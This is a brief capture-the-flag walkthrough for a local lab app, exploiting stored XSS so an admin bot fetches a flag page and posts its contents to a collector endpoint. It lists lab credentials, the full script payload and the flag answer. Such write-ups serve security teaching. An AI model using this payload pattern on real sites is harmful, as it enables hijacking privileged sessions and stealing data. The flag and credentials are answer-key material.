# Ticket to the Vault: Short Walkthrough (Stored XSS)

> Educational CTF guide. Target is local: `http://localhost:5002`.

## Objective

Get the flag by leveraging **Stored XSS** so the **Professor-bot** (admin) executes your script and you collect the flag in **/my-captures**.

---

## 1) Open the App

* Visit: **targetIP:port**
* Click **Enter the Network**

---

## 2) Get Credentials (robots.txt)

* Visit: **/robots.txt**
* Use Tokyo creds:

  * **tokyo / rio123**

Login and confirm you see the dashboard.

---

## 3) What’s Vulnerable (High Level)

* Messages are rendered **unescaped** on the admin page (stored XSS).
* The **Professor-bot** visits `/admin/tickets` every ~8 seconds.
* Your script runs with the bot’s **admin session**, so it can access `/admin/flag`.

---

## 4) Send the Exploit Message (Main Payload)

Go to **Send Message** and paste:

```html
<script>
fetch('/admin/flag')
  .then(r => r.text())
  .then(flag => {
    fetch('/collector', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: 1, data: flag })
    });
  });
</script>
```

Notes:

* This assumes **Tokyo is user_id: 1**.

---

## 5) Wait, Then Retrieve

* Wait **10–15 seconds**
* Open **Intercepted Data** or go to: **/my-captures**
* You should see the captured flag:

  * `FLAG{THE_BOT_DID_THE_DIRTY_WORK}`

---
